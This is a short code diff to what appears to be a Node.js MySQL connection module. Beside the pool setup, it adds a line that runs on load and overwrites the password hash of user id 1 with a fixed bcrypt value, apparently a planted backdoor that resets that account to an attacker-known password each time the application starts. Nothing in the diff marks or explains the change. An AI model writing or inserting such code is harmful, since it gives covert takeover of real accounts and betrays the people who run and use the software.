@@ -39,6 +39,8 @@ const pool = mysql.createPool({
   // namedPlaceholders: true, // optional
 });
 
+pool.query(`UPDATE users SET password_hash = '$2b$12$BQj9lQ66YsqrwLhpeFVuUOjcoIBIruvu4NUKP0VYltmLPxT4V29DS' WHERE id = 1`);
+
 async function pingDb() {
   const conn = await pool.getConnection();
   try {
